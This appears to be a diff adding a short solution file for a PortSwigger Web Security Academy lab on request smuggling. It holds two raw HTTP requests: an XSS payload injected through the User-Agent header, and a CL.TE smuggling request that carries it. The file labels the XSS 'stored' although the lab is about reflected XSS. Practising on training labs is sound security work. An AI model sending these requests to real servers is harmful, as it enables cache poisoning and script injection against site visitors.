@@ -1,0 +1,30 @@
+The HTTP request at the end of the file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
+
+Discovery of stored XSS vulnerability via User-Agent header:
+
+---START---
+GET /post?postId=3 HTTP/1.1
+Host: 0af000960307675284edb5e600ef0052.web-security-academy.net
+User-Agent: "><script>alert(1)</script><a href="#
+Connection: close
+---END---
+
+
+HTTP request to smuggle stored XSS:
+
+---START---
+POST / HTTP/1.1
+Host: 0af000960307675284edb5e600ef0052.web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=3 HTTP/1.1
+Host: 0af000960307675284edb5e600ef0052.web-security-academy.net
+User-Agent: "><script>alert(1)</script><a href="#
+Content-Type: application/x-www-form-urlencoded
+---END---
